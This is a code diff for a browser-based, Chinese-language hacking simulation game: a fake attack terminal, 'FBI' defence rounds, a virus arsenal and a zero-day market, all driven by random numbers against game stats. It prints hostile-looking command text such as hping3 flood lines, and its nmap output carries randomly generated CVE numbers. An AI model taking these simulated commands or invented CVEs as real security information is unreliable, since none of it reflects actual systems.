+        html += '<div class="server-hp-bar" style="margin-top:10px;height:16px;"><div class="server-hp-fill ' + hpCls + '" style="width:' + hpPct + '%"></div></div>';
+        html += '<div style="font-size:10px;color:#993C1D;margin-top:4px;">HP ' + t.hp + '/' + t.maxHp + ' (' + Math.round(hpPct) + '%)</div>';
+    }
+    html += '</div>';
+
+    if (t.isBroken) {
+        html += '<div style="background:rgba(0,255,65,0.1);border:1px solid #00ff41;border-radius:6px;padding:12px;margin-bottom:12px;">';
+        html += '<div style="font-size:12px;color:#00ff41;">✅ 隧道已被攻破！</div>';
+        html += '<div style="font-size:11px;color:#00aa00;margin-top:6px;">效果：FBI保护群效果削弱70%（成功率惩罚-20%→-6%），蜜罐系统永久崩溃</div>';
+        html += '</div>';
+    }
+
+    // 攻破效果说明
+    if (!t.isBroken) {
+        html += '<div style="background:rgba(255,68,68,0.08);border:1px solid #ff4444;border-radius:6px;padding:10px;margin-bottom:12px;font-size:11px;color:#ff6644;">';
+        html += '⚠ <b>攻破效果</b>：网络A与网络B全部服务器群受70%影响<br>';
+        html += '· FBI保护群成功率惩罚 -20% → -6%（削弱70%）<br>';
+        html += '· 蜜罐系统直接永久崩溃（-60%惩罚归零）<br>';
+        html += '· 蜜罐无法再被激活';
+        html += '</div>';
+    }
+
+    // 终端
+    html += '<div class="terminal" id="tunnelTermOutput"></div>';
+    html += '<div class="cmd-input-row">';
+    html += '<input type="text" class="cmd-input" id="tunnelCmdInput" placeholder="输入命令..." onkeydown="if(event.key===\'Enter\')executeTunnelCmd()"/>';
+    html += '<button class="quick-btn" onclick="executeTunnelCmd()">▶ 执行</button>';
+    html += '</div>';
+    html += '<div class="quick-btns">';
+    html += '<button class="quick-btn" onclick="tunnelQuickCmd(\'nmap\')">📡 nmap -sV -A</button>';
+    html += '<button class="quick-btn" onclick="tunnelQuickCmd(\'exploit\')">⚔️ exploit</button>';
+    html += '<button class="quick-btn" onclick="tunnelQuickCmd(\'ddos\')">💥 hping3</button>';
+    html += '<button class="quick-btn" onclick="tunnelQuickCmd(\'full_auto\')">🚀 全自动</button>';
+    html += '</div>';
+
+    el.innerHTML = html;
+    // 初始化隧道终端
+    TUNNEL_TERM = document.getElementById('tunnelTermOutput');
+    TUNNEL_TERM.innerHTML = '';
+    tunnelTermPrint('[*] World Web Attack Terminal - Tunnel Module', 'term-info');
+    tunnelTermPrint('[*] Target: ' + t.name + ' (Lv.' + t.level + ' DEF:' + t.defense + ' HP:' + t.hp + '/' + t.maxHp + ')', 'term-out');
+    if (!t.reconDone && !t.isBroken) {
+        tunnelTermPrint('[*] 建议先执行 nmap 扫描', 'term-warn');
+    }
+    if (t.isBroken) {
+        tunnelTermPrint('[+] 隧道已被攻破，FBI防御系统已削弱', 'term-ok');
+    }
+}
+
+function tunnelTermPrint(msg, cls) {
+    if (!TUNNEL_TERM) TUNNEL_TERM = document.getElementById('tunnelTermOutput');
+    if (!TUNNEL_TERM) return;
+    var div = document.createElement('div');
+    div.className = 'term-line ' + (cls || 'term-out');
+    div.textContent = msg;
+    TUNNEL_TERM.appendChild(div);
+    TUNNEL_TERM.scrollTop = TUNNEL_TERM.scrollHeight;
+}
+
+function tunnelTermPrintCmd(cmd) {
+    tunnelTermPrint('$ ' + cmd, 'term-cmd');
+}
+
+function executeTunnelCmd() {
+    var input = document.getElementById('tunnelCmdInput');
+    if (!input) return;
+    var cmd = input.value.trim();
+    input.value = '';
+    if (!cmd) return;
+    tunnelTermPrintCmd(cmd);
+    var parts = cmd.split(/\s+/);
+    var main = parts[0].toLowerCase();
+    switch(main) {
+        case 'help': case '?':
+            tunnelTermPrint('=== 隧道攻击命令 ===', 'term-warn');
+            tunnelTermPrint('  nmap -sV -A          扫描隧道', 'term-out');
+            tunnelTermPrint('  exploit <vuln>       漏洞利用攻击', 'term-out');
+            tunnelTermPrint('  hping3 --flood       DDoS洪水攻击', 'term-out');
+            tunnelTermPrint('  full_auto            全自动攻击', 'term-out');
+            tunnelTermPrint('  clear                清屏', 'term-out');
+            break;
+        case 'nmap': case 'scan':
+            cmdTunnelNmap();
+            break;
+        case 'exploit':
+            cmdTunnelExploit(parts[1] || 'auto');
+            break;
+        case 'hping3': case 'ddos':
+            cmdTunnelDdos();
+            break;
+        case 'full_auto': case 'auto':
+            cmdTunnelFullAuto();
+            break;
+        case 'clear': case 'cls':
+            TUNNEL_TERM.innerHTML = '';
+            break;
+        default:
+            tunnelTermPrint('Unknown command: ' + main, 'term-err');
+            tunnelTermPrint('输入 help 查看可用命令', 'term-dim');
+    }
+}
+
+function tunnelQuickCmd(type) {
+    switch(type) {
+        case 'nmap':
+            tunnelTermPrintCmd('nmap -sV -A tunnel');
+            cmdTunnelNmap();
+            break;
+        case 'exploit':
+            tunnelTermPrintCmd('exploit tunnel --type=rce');
+            cmdTunnelExploit('rce');
+            break;
+        case 'ddos':
+            tunnelTermPrintCmd('hping3 --flood -S tunnel');
+            cmdTunnelDdos();
+            break;
+        case 'full_auto':
+            tunnelTermPrintCmd('full_auto tunnel');
+            cmdTunnelFullAuto();
+            break;
+    }
+}
+
+// ===== 隧道攻击函数 =====
+function cmdTunnelNmap() {
+    var data = loadData();
+    var t = data.tunnel;
+    if (t.isBroken) { tunnelTermPrint('[*] 隧道已被攻破', 'term-warn'); return; }
+
+    tunnelTermPrint('Starting Nmap 7.94 scan against tunnel endpoint...', 'term-info');
+    setTimeout(function() {
+        tunnelTermPrint('Nmap scan report for 10.1.9.1 (Tunnel Gateway)', 'term-out');
+        tunnelTermPrint('Host is up (0.031s latency).', 'term-out');
+        tunnelTermPrint('', 'term-out');
+        tunnelTermPrint('PORT     STATE SERVICE    VERSION', 'term-out');
+        tunnelTermPrint('22/tcp   open  ssh        OpenSSH 8.9 (protocol 2.0)', 'term-out');
+        tunnelTermPrint('80/tcp   open  http       nginx 1.25.0 (reverse proxy)', 'term-out');
+        tunnelTermPrint('443/tcp  open  ssl/http   nginx 1.25.0 (tunnel endpoint)', 'term-out');
+        tunnelTermPrint('3306/tcp open  mysql      MySQL 8.0.35 (tunnel db)', 'term-out');
+        tunnelTermPrint('8080/tcp open  http-proxy Squid 5.7 (proxy tunnel)', 'term-out');
+        tunnelTermPrint('', 'term-out');
+        tunnelTermPrint('OS detection: Linux 5.15.x (kernel)', 'term-out');
+        tunnelTermPrint('Service Info: Tunnel Gateway Lv.' + t.level + ' DEF:' + t.defense, 'term-warn');
+        tunnelTermPrint('', 'term-out');
+        tunnelTermPrint('Vulnerabilities detected:', 'term-warn');
+        t.vulnerabilities.forEach(function(v) {
+            tunnelTermPrint('  [!] ' + v.toUpperCase() + ' - CVE-2024-' + randInt(1000,9999), 'term-err');
+        });
+        tunnelTermPrint('', 'term-out');
+        tunnelTermPrint('Nmap done: 1 host scanned in 2.31 seconds', 'term-info');
+
+        t.reconDone = true;
+        saveData(data);
+        tunnelTermPrint('[+] 扫描完成！可使用 exploit/hping3/full_auto 攻击', 'term-ok');
+    }, 800);
+}
+
+function cmdTunnelExploit(vulnType) {
+    var data = loadData();
+    var t = data.tunnel;
+    if (t.isBroken) { tunnelTermPrint('[*] 隧道已被攻破', 'term-warn'); return; }
+    if (!t.reconDone) { tunnelTermPrint('[-] 请先执行 nmap 扫描', 'term-err'); return; }
+
+    if (vulnType === 'auto') vulnType = t.vulnerabilities[0] || 'rce';
+
+    var atkPower = calcPlayerAttack(data);
+    var base = 50;
+    var atkBonus = Math.min(30, Math.floor(atkPower / Math.max(1, t.defense) * 20));
+    var lvlPenalty = t.level * 3;
+    var rate = base + atkBonus - lvlPenalty;
+    // 漏洞类型加成
+    if (t.vulnerabilities.indexOf(vulnType) >= 0) rate += 15;
+    rate = clamp(rate, 5, 80);
+
+    tunnelTermPrint('[*] Launching exploit against tunnel endpoint...', 'term-info');
+    tunnelTermPrint('[*] Using vulnerability: ' + vulnType.toUpperCase(), 'term-out');
+    tunnelTermPrint('[*] Attack power: ' + atkPower + ' vs Defense: ' + t.defense, 'term-out');
+    tunnelTermPrint('[*] Success rate: ' + rate + '%', 'term-warn');
+
+    setTimeout(function() {
+        if (Math.random() * 100 < rate) {
+            var damage = Math.floor(t.maxHp * (0.05 + Math.random() * 0.1));
+            // 强制修复buff检测
+            if (t.forceRepairBuff > 0) {
+                if (Math.random() < 0.7) {
+                    tunnelTermPrint('[!] FBI FORCE REPAIR SHIELD: Attack blocked!', 'term-err');
+                    saveData(data); renderTunnel(data); return;
+                }
+                damage = Math.floor(damage * 0.1);
+                tunnelTermPrint('[!] 修复防护减伤90%！实际伤害 ' + damage, 'term-warn');
+            }
+            t.hp = Math.max(0, t.hp - damage);
+            tunnelTermPrint('[+] Exploit successful! Damage: ' + damage, 'term-ok');
+            tunnelTermPrint('[*] Tunnel HP: ' + t.hp + '/' + t.maxHp, 'term-out');
+
+            if (t.hp <= 0) {
+                markServerBroken(data, t, getServerCluster(data, t));
+                tunnelTermPrint('', 'term-out');
+                tunnelTermPrint('[★] ═══════════════════════════════════', 'term-ok');
+                tunnelTermPrint('[★] TUNNEL COMPROMISED!', 'term-ok');
+                tunnelTermPrint('[★] 代理隧道已被攻破！', 'term-ok');
+                tunnelTermPrint('[★] FBI防御系统削弱70%，蜜罐永久崩溃！', 'term-ok');
+                tunnelTermPrint('[★] ═══════════════════════════════════', 'term-ok');
+                addLog(data, 'broken', '★ 代理隧道被攻破！FBI保护削弱70%，蜜罐永久崩溃！');
+                data.fbi.honeypotActive = false;
+            }
+            saveData(data);
+            renderTunnel(data);
+        } else {
+            tunnelTermPrint('[-] Exploit failed. Tunnel defense too strong.', 'term-err');
+            saveData(data);
+        }
+    }, 600);
+}
+
+function cmdTunnelDdos() {
+    var data = loadData();
+    var t = data.tunnel;
+    if (t.isBroken) { tunnelTermPrint('[*] 隧道已被攻破', 'term-warn'); return; }
+
+    var ownedCount = countOwnedClusters(data);
+    if (ownedCount === 0) { tunnelTermPrint('[-] 需要至少占领1个群才能发动DDoS', 'term-err'); return; }
+
+    tunnelTermPrint('[*] Launching DDoS flood with ' + ownedCount + ' botnet clusters...', 'term-info');
+    tunnelTermPrint('[*] hping3 --flood -S -p 443 tunnel', 'term-out');
+
+    setTimeout(function() {
+        var damage = ownedCount * randInt(50, 150);
+        // 隧道防御力减成
+        var reduction = Math.floor(damage * (t.defense / (t.defense + 5000)));
+        damage -= reduction;
+        tunnelTermPrint('[*] Raw damage: ' + (damage + reduction) + ' | Defense reduction: ' + reduction, 'term-out');
+
+        if (damage > 0) {
+            t.hp = Math.max(0, t.hp - damage);
+            tunnelTermPrint('[+] DDoS hit! Damage: ' + damage, 'term-ok');
+            tunnelTermPrint('[*] Tunnel HP: ' + t.hp + '/' + t.maxHp, 'term-out');
+
+            if (t.hp <= 0) {
+                markServerBroken(data, t, getServerCluster(data, t));
+                tunnelTermPrint('[★] TUNNEL COMPROMISED via DDoS!', 'term-ok');
+                tunnelTermPrint('[★] 代理隧道已被攻破！FBI削弱70%，蜜罐永久崩溃！', 'term-ok');
+                addLog(data, 'broken', '★ 代理隧道被DDoS攻破！FBI保护削弱70%，蜜罐永久崩溃！');
+                data.fbi.honeypotActive = false;
+            }
+        } else {
+            tunnelTermPrint('[-] DDoS fully absorbed by tunnel defense', 'term-err');
+        }
+        saveData(data);
+        renderTunnel(data);
+    }, 800);
+}
+
+function cmdTunnelFullAuto() {
+    var data = loadData();
+    var t = data.tunnel;
+    if (t.isBroken) { tunnelTermPrint('[*] 隧道已被攻破', 'term-warn'); return; }
+
+    tunnelTermPrint('[*] ═════全自动攻击模式启动═══', 'term-info');
+    tunnelTermPrint('[*] Target: 代理隧道 (Lv.' + t.level + ' DEF:' + t.defense + ')', 'term-out');
+
+    // Step 1: nmap
+    if (!t.reconDone) {
+        tunnelTermPrint('[*] Phase 1: Reconnaissance...', 'term-info');
+        cmdTunnelNmap();
+        setTimeout(function() { cmdTunnelFullAutoPhase2(); }, 1500);
+    } else {
+        tunnelTermPrint('[*] 已有扫描数据，跳过侦察阶段', 'term-dim');
+        cmdTunnelFullAutoPhase2();
+    }
+}
+
+function cmdTunnelFullAutoPhase2() {
+    var data = loadData();
+    var t = data.tunnel;
+    if (t.isBroken) { tunnelTermPrint('[*] 隧道已被攻破', 'term-warn'); return; }
+
+    tunnelTermPrint('[*] Phase 2: Exploit...', 'term-info');
+    var atkPower = calcPlayerAttack(data);
+    var vuln = t.vulnerabilities[0] || 'rce';
+    var base = 50;
+    var atkBonus = Math.min(30, Math.floor(atkPower / Math.max(1, t.defense) * 20));
+    var rate = clamp(base + atkBonus - t.level * 3 + 15, 5, 80);
+
+    tunnelTermPrint('[*] Using: ' + vuln.toUpperCase() + ' | Rate: ' + rate + '%', 'term-warn');
+
+    setTimeout(function() {
+        if (Math.random() * 100 < rate) {
+            var damage = Math.floor(t.maxHp * 0.15);
+            t.hp = Math.max(0, t.hp - damage);
+            tunnelTermPrint('[+] Exploit success! Damage: ' + damage + ' | HP: ' + t.hp + '/' + t.maxHp, 'term-ok');
+        } else {
+            tunnelTermPrint('[-] Exploit failed', 'term-err');
+        }
+
+        if (t.hp <= 0) {
+            markServerBroken(data, t, getServerCluster(data, t));
+            tunnelTermPrint('[★] TUNNEL COMPROMISED!', 'term-ok');
+            tunnelTermPrint('[★] FBI防御系统削弱70%，蜜罐永久崩溃！', 'term-ok');
+            addLog(data, 'broken', '★ 代理隧道被全自动攻破！FBI保护削弱70%，蜜罐永久崩溃！');
+            data.fbi.honeypotActive = false;
+            saveData(data);
+            renderTunnel(data);
+            return;
+        }
+
+        // Phase 3: DDoS
+        tunnelTermPrint('[*] Phase 3: DDoS flood...', 'term-info');
+        var ownedCount = countOwnedClusters(data);
+        if (ownedCount > 0) {
+            var ddosDmg = ownedCount * randInt(50, 150);
+            var reduction = Math.floor(ddosDmg * (t.defense / (t.defense + 5000)));
+            ddosDmg -= reduction;
+            if (ddosDmg > 0) {
+                t.hp = Math.max(0, t.hp - ddosDmg);
+                tunnelTermPrint('[+] DDoS damage: ' + ddosDmg + ' | HP: ' + t.hp + '/' + t.maxHp, 'term-ok');
+            } else {
+                tunnelTermPrint('[-] DDoS absorbed by defense', 'term-err');
+            }
+        } else {
+            tunnelTermPrint('[-] 无僵尸网络，跳过DDoS', 'term-dim');
+        }
+
+        if (t.hp <= 0) {
+            markServerBroken(data, t, getServerCluster(data, t));
+            tunnelTermPrint('[★] TUNNEL COMPROMISED!', 'term-ok');
+            addLog(data, 'broken', '★ 代理隧道被全自动攻破！FBI保护削弱70%，蜜罐永久崩溃！');
+            data.fbi.honeypotActive = false;
+        } else {
+            tunnelTermPrint('[*] 全自动一轮完成 | HP剩余: ' + t.hp + '/' + t.maxHp, 'term-warn');
+            tunnelTermPrint('[*] 可继续执行 full_auto 进行下一轮', 'term-dim');
+        }
+        saveData(data);
+        renderTunnel(data);
+    }, 800);
+}
+
+// ===== 渲染：日志 =====
+function renderLogs(data) {
+    var el = document.getElementById('logContainer');
+    if (data.logs.length === 0) {
+        el.innerHTML = '<div class="log-entry"><span class="log-ts">--:--:--</span><span class="log-type system">系统</span><span class="log-msg">等待操作...</span></div>';
+        return;
+    }
+    el.innerHTML = data.logs.map(function(l) {
+        return '<div class="log-entry"><span class="log-ts">' + l.ts + '</span><span class="log-type ' + l.type + '">' + l.type + '</span><span class="log-msg">' + l.msg + '</span></div>';
+    }).join('');
+}
+
+// ===== FBI强制性修复 =====
+function executeForceRepair(data) {
+    // 1. 收集所有群中已攻破的服务器，按群分组
+    var brokenByCluster = [];
+    data.clusters.forEach(function(c) {
+        var broken = c.servers.filter(function(s) { return s.isBroken; });
+        if (broken.length > 0) {
+            brokenByCluster.push({ cluster: c, servers: broken });
+        }
+    });
+    if (brokenByCluster.length === 0) return;
+
+    // 2. 随机打乱，从不同群各选1台，最多3台
+    var shuffled = shuffleArr(brokenByCluster);
+    var repairTargets = [];
+    for (var i = 0; i < Math.min(3, shuffled.length); i++) {
+        var entry = shuffled[i];
+        var picked = entry.servers[randInt(0, entry.servers.length - 1)];
+        repairTargets.push({ server: picked, cluster: entry.cluster });
+    }
+
+    // 3. 执行修复
+    var repairedNames = [];
+    repairTargets.forEach(function(t) {
+        t.server.isBroken = false;
+        t.server.hp = t.server.maxHp;
+        t.server.reconDone = false;
+        t.server.forceRepairBuff = 3;
+        t.server.forceRepairDefense = 0.9;
+        repairedNames.push(t.cluster.name + '/' + t.server.name);
+    });
+    addLog(data, 'fbi', '🔧 FBI强制性修复：修复了 ' + repairedNames.join(', ') + ' (90%防御buff 3回合)');
+
+    // 4. 检查被修复的群是否有超过3台服务器被修复 → 失去控制权 + 加入FBI保护群
+    var checkedClusters = {};
+    repairTargets.forEach(function(t) {
+        if (checkedClusters[t.cluster.id]) return;
+        checkedClusters[t.cluster.id] = true;
+        var repairedCount = t.cluster.servers.filter(function(s) { return !s.isBroken; }).length;
+        if (repairedCount > 3 && t.cluster.isOwned) {
+            t.cluster.isOwned = false;
+            t.cluster.ownedSince = null;
+            var idx = data.player.ownedClusters.indexOf(t.cluster.id);
+            if (idx >= 0) data.player.ownedClusters.splice(idx, 1);
+            // 加入FBI保护群
+            if (data.fbi.protectedClusters.indexOf(t.cluster.id) < 0) {
+                data.fbi.protectedClusters.push(t.cluster.id);
+            }
+            addLog(data, 'fbi', '🔴 ' + t.cluster.name + ' 有' + repairedCount + '台服务器被FBI修复！超过3台，玩家失去控制权，群变为FBI保护群！');
+        }
+    });
+}
+
+// ===== 回合处理 =====
+function processRound() {
+    var data = loadData();
+    var lastRound = data.currentRound;
+    var hackRound = parseInt(localStorage.getItem(ROUND_KEY) || '0', 10);
+
+    if (hackRound <= lastRound) return; // 没有新回合
+    var roundsToProcess = Math.min(hackRound - lastRound, 10); // 最多处理10回合
+
+    for (var r = 0; r < roundsToProcess; r++) {
+        data.currentRound = lastRound + r + 1;
+
+        // 1. 僵尸网络自动攻击
+        var ownedClusters = data.clusters.filter(function(c){return c.isOwned;});
+        ownedClusters.forEach(function(c) {
+            // 找一个相连的未占领群
+            var targets = c.connections.map(function(cid){return getCluster(data, cid);}).filter(function(t){return t && !t.isOwned;});
+            if (targets.length === 0) return;
+            var target = targets[randInt(0, targets.length-1)];
+            var availServers = target.servers.filter(function(s){return !s.isBroken;});
+            if (availServers.length === 0) return;
+            var srv = availServers[randInt(0, availServers.length-1)];
+            var totalLevel = c.servers.reduce(function(sum, s){return sum + s.level;}, 0);
+            var damage = Math.floor(totalLevel * 2 * (0.2 + Math.random() * 0.3));
+            // 僵尸网络也受强制修复buff影响
+            var frChk = checkForceRepair(srv, data);
+            if (!frChk.blocked) {
+                damage = Math.floor(damage * frChk.damageMul);
+                srv.hp = Math.max(0, srv.hp - damage);
+            } else {
+                damage = 0;
+            }
+            var msg = c.name + ' 自动攻击 ' + target.name + '/' + srv.name;
+            if (frChk.blocked) {
+                msg += ' · 被FBI修复护盾拦截！';
+            } else if (frChk.reduced) {
+                msg += ' · 修复buff减伤90%，造成' + damage + '伤害';
+            } else {
+                msg += ' 造成' + damage + '伤害';
+            }
+            if (srv.hp <= 0) {
+                markServerBroken(data, srv, getServerCluster(data, srv));
+                msg += ' · 攻破！';
+                checkClusterBroken(data, target);
+            }
+            addLog(data, 'botnet', msg);
+            data.player.hackTraceScore += 1;
+        });
+
+        // 2. FBI扫描（每2回合扫描一次）
+        if (data.currentRound % 2 === 0 && !data.fbi.active && !data.fbi.defeated) {
+            var detectRate = countBrokenServers(data) * 2;
+            if (data.fbi.scanBoostEnds > data.currentRound) detectRate *= 2; // 蜜罐翻倍
+            if (Math.random() * 100 < detectRate) {
+                data.fbi.active = true;
+                // FBI保护1~2个未占领群
+                var unprotected = data.clusters.filter(function(c){return !c.isOwned;});
+                var protectCount = Math.min(randInt(1, 2), unprotected.length);
+                var shuffled = shuffleArr(unprotected);
+                data.fbi.protectedClusters = shuffled.slice(0, protectCount).map(function(c){return c.id;});
+                addLog(data, 'fbi', '🚨 FBI介入！保护 ' + protectCount + ' 个服务器群');
+            }
+        } else if (data.fbi.active && data.currentRound % 2 === 0) {
+            // 检查是否开启蜜罐（隧道攻破后蜜罐永久失效，无法再激活）
+            if (!data.fbi.honeypotActive && !(data.tunnel && data.tunnel.isBroken) && calcPlayerAttack(data) > 100) {
+                data.fbi.honeypotActive = true;
+                addLog(data, 'fbi', '🍯 FBI开启蜜罐系统！玩家攻击力>100');
+            }
+            // FBI更新保护目标
+            if (data.currentRound % 5 === 0) {
+                var prot = data.clusters.filter(function(c){return !c.isOwned;});
+                var pc = Math.min(randInt(1, 2), prot.length);
+                data.fbi.protectedClusters = shuffleArr(prot).slice(0, pc).map(function(c){return c.id;});
+                addLog(data, 'fbi', 'FBI更新保护目标');
+            }
+        }
+
+        // 3. FBI冷却恢复
+        if (data.fbi.defeated && data.fbi.defeatCooldown > 0) {
+            data.fbi.defeatCooldown--;
+            if (data.fbi.defeatCooldown <= 0) {
+                data.fbi.defeated = false;
+                data.fbi.active = false;
+                addLog(data, 'fbi', 'FBI冷却结束，可重新触发');
+            }
+        }
+
+        // 4. FBI强制性修复（全占领时每回合执行，不受2回合限制）
+        var allClustersOwned = data.clusters.every(function(c) { return c.isOwned; });
+        if (allClustersOwned && !data.fbi.forceRepairActive) {
+            data.fbi.forceRepairActive = true;
+            addLog(data, 'fbi', '⚠ FBI启动「强制性修复」协议！全服务器群被占领，每回合修复3台！');
+        }
+        if (!allClustersOwned && data.fbi.forceRepairActive) {
+            data.fbi.forceRepairActive = false;
+            addLog(data, 'fbi', 'FBI强制性修复暂停：不再全占领');
+        }
+        if (data.fbi.forceRepairActive && !data.fbi.defeated) {
+            executeForceRepair(data);
+        }
+
+        // 6. 病毒持续时间递减
+        if (data.activeViruses && data.activeViruses.length > 0) {
+            data.activeViruses = data.activeViruses.filter(function(av) {
+                av.duration--;
+                return av.duration > 0;
+            });
+        }
+        // 7. 0day过期处理
+        if (data.zeroDays && data.zeroDays.length > 0) {
+            data.zeroDays.forEach(function(zd) {
+                if (zd.expiryRound <= data.currentRound && !zd.used && !zd.sold) {
+                    addLog(data, 'system', '💎 0day漏洞 ' + zd.name + ' (' + zd.grade + ') 已过期，被厂商修补');
+                }
+            });
+            data.zeroDays = data.zeroDays.filter(function(zd) {
+                return zd.expiryRound > data.currentRound || zd.used || zd.sold;
+            });
+        }
+        // 8. NPC买家刷新 (每5回合)
+        if (data.currentRound % 5 === 0 && data.zeroDayBuyers) {
+            data.zeroDayBuyers.forEach(function(b) {
+                b.budget = (b.budget * (0.8 + Math.random() * 0.4)).toFixed(2);
+                b.refreshRound = data.currentRound;
+            });
+        }
+
+        // 5. 强制修复buff递减
+        data.clusters.forEach(function(c) {
+            c.servers.forEach(function(s) {
+                if (s.forceRepairBuff > 0) {
+                    s.forceRepairBuff--;
+                    if (s.forceRepairBuff <= 0) {
+                        s.forceRepairDefense = 0;
+                    }
+                }
+            });
+        });
+    }
+
+    saveData(data);
+    renderStats(data);
+    // 刷新当前tab
+    var activeTab = document.querySelector('.tab-btn.active');
+    if (activeTab) activeTab.click();
+}
+
+// ===== 重置 =====
+function confirmReset() {
+    if (confirm('⚠ 确认重置世界服务器？所有攻破进度将丢失！')) {
+        localStorage.removeItem(WORLD_STATE_KEY);
+        localStorage.removeItem(ROUND_KEY);
+        location.reload();
+    }
+}
+
+// ===== 初始化 =====
+function init() {
+    if (!checkUnlock()) return;
+    var data = loadData();
+    // 确保数据结构完整
+    if (!data.clusters || data.clusters.length === 0) {
+        data = initWorldData();
+        saveData(data);
+    }
+    // 旧存档兼容：补充新字段
+    if (data.fbi.forceRepairActive === undefined) {
+        data.fbi.forceRepairActive = false;
+    }
+    data.clusters.forEach(function(c) {
+        c.servers.forEach(function(s) {
+            if (s.forceRepairBuff === undefined) s.forceRepairBuff = 0;
+            if (s.forceRepairDefense === undefined) s.forceRepairDefense = 0;
+        });
+    });
+        // 旧存档兼容：补充病毒和0day字段
+    if (!data.viruses) data.viruses = [];
+    if (!data.playerViruses) data.playerViruses = [];
+    if (!data.zeroDays) data.zeroDays = [];
+    if (!data.activeViruses) data.activeViruses = [];
+    if (!data.zeroDayBuyers) data.zeroDayBuyers = [
+        { id: 'buyer_1', name: '暗影集团', budget: 2.5, preferGrade: 'Critical', refreshRound: 0 },
+        { id: 'buyer_2', name: '某国情报机构', budget: 1.8, preferGrade: 'High', refreshRound: 0 },
+        { id: 'buyer_3', name: '黑客组织404', budget: 0.8, preferGrade: 'Medium', refreshRound: 0 },
+        { id: 'buyer_4', name: '企业安全公司', budget: 0.5, preferGrade: 'Low', refreshRound: 0 },
+        { id: 'buyer_5', name: '地下犯罪集团', budget: 3.0, preferGrade: 'Critical', refreshRound: 0 }
+    ];
+    if (!data.mineState) data.mineState = { active: false, progress: 0, total: 0, results: [] };
+// 旧存档兼容：补充tunnel字段
+    if (!data.tunnel) {
+        data.tunnel = {
+            name: '代理隧道',
+            desc: '政府内网 ↔ 国际根服务器 跨网代理隧道',
+            level: 10,
+            attackPower: 5000,
+            defense: 10000,
+            hp: 10000,
+            maxHp: 10000,
+            isBroken: false,
+            reconDone: false,
+            vulnerabilities: ['rce', 'weak_ssh', 'open_port', 'default_pass']
+        };
+    }
+    saveData(data);
+    renderStats(data);
+    renderMap(data);
+    // 轮询检测回合变化
+    setInterval(processRound, 2000);
+    // 自动回合：每20秒+1回合
+    setInterval(function() {
+        var cur = parseInt(localStorage.getItem(ROUND_KEY) || '0', 10);
+        localStorage.setItem(ROUND_KEY, String(cur + 1));
+    }, 20000);
+}
+
+// ====== 回合处理：清理挖掘标记 ======
+// 必须在 init() 之前重写 processRound，否则 setInterval 会捕获旧引用
+(function(){
+    var _origProcessRound = processRound;
+    processRound = function() {
+        _origProcessRound();
+        // 清理 _minedThisSession 标记（新回合可以重新挖掘）
+        var data = loadData();
+        data.mineState.active = false;
+        data.clusters.forEach(function(c) {
+            c.servers.forEach(function(s) {
+                s._minedThisSession = false;
+            });
+        });
+        saveData(data);
+    };
+})();
+
+init();
+
+
+// ====== Phase 3-4 数据定义 ======
+var VIRUS_TYPES = [
+    { id: 'ransomware', name: '勒索病毒',  icon: '🔒', desc: '加密目标系统文件，勒索赎金',        infectRate: 0.90, damage: 80, stealth: 0.30, devCostBTC: 0.50, devRounds: 3 },
+    { id: 'worm',       name: '蠕虫病毒',  icon: '🪱', desc: '自我复制跨服务器传播，感染率极高',    infectRate: 0.95, damage: 40, stealth: 0.50, devCostBTC: 0.30, devRounds: 2 },
+    { id: 'trojan',     name: '木马病毒',  icon: '🐴', desc: '伪装正常程序，隐蔽性高',            infectRate: 0.70, damage: 60, stealth: 0.80, devCostBTC: 0.40, devRounds: 2 },
+    { id: 'logic_bomb', name: '逻辑炸弹',  icon: '💣', desc: '埋藏于系统中，触发后造成巨大破坏',    infectRate: 0.50, damage: 100,stealth: 0.90, devCostBTC: 0.60, devRounds: 4 },
+    { id: 'rootkit',    name: 'Rootkit',  icon: '👻', desc: '深度隐藏于内核，极难检测',           infectRate: 0.60, damage: 50, stealth: 0.95, devCostBTC: 0.70, devRounds: 5 },
+    { id: 'keylogger',  name: '键盘记录器', icon: '⌨️',  desc: '记录击键窃取凭据，隐蔽性高',        infectRate: 0.80, damage: 20, stealth: 0.85, devCostBTC: 0.35, devRounds: 2 },
+    { id: 'botnet_virus',name:'僵尸网络病毒',icon: '🧟', desc: '将目标服务器纳入僵尸网络',          infectRate: 0.85, damage: 70, stealth: 0.60, devCostBTC: 0.80, devRounds: 4 },
+    { id: 'fileless',   name: '无文件病毒', icon: '💨', desc: '驻留内存无文件痕迹，极难检测',       infectRate: 0.75, damage: 65, stealth: 0.98, devCostBTC: 1.00, devRounds: 6 }
+];
+var ZERODAY_GRADES = {
+    Critical: { successBonus: 40, decayRounds: 8,  valueBase: 3.0, color: '#ff1744' },
+    High:     { successBonus: 25, decayRounds: 12, valueBase: 1.5, color: '#ff9100' },
+    Medium:   { successBonus: 15, decayRounds: 16, valueBase: 0.7, color: '#ffea00' },
+    Low:      { successBonus: 8,  decayRounds: 20, valueBase: 0.3, color: '#76ff03' }
+};
+var ZERODAY_NAMES_BY_TARGET = {
+    WebServer:   ['Remote Code Execution', 'Auth Bypass', 'Path Traversal', 'SSRF'],
+    Database:    ['SQL Injection Chain', 'NoSQL Injection', 'Database Takeover', 'Query Injection'],
+    OS:          ['Kernel PrivEsc', 'Memory Corruption', 'Use-After-Free', 'Race Condition'],
+    Network:     ['Protocol Stack Overflow', 'ARP Spoofing Chain', 'DNS Cache Poisoning', 'BGP Hijack'],
+    Application: ['Deserialization Attack', 'XXE Injection', 'SSTI', 'API Key Leak']
+};
+
+// ====== Phase 3: 病毒武器库渲染 ======
+function renderVirus(data) {
+    var el = document.getElementById('tab-virus');
+    if (!el) return;
+    
+    var html = '<div class="virus-panel">';
+    html += '<h3>🦠 病毒武器库</h3>';
+    
+    // 玩家已有病毒
+    html += '<div class="fbi-section">';
+    html += '<div class="fbi-section-title">你的病毒武器库</div>';
+    if (!data.playerViruses || data.playerViruses.length === 0) {
+        html += '<p style="color:#006600;font-size:10px;">尚未研发任何病毒。请在下方选择病毒类型研发。</p>';
+    } else {
+        html += '<div style="display:flex;flex-wrap:wrap;gap:8px;">';
+        data.playerViruses.forEach(function(pv, idx) {
+            var vt = VIRUS_TYPES.find(function(v){return v.id === pv.virusId;}) || {};
+            html += '<div class="zd-card" style="border-color:#ff1744;min-width:180px;">';
+            html += '<div style="font-size:14px;">' + (vt.icon || '🦠') + ' ' + pv.name + '</div>';
+            html += '<div style="font-size:9px;color:#999;">感染率 ' + Math.round(pv.infectRate*100) + '% | 伤害 ' + pv.damage + ' | 隐蔽 ' + Math.round(pv.stealth*100) + '%</div>';
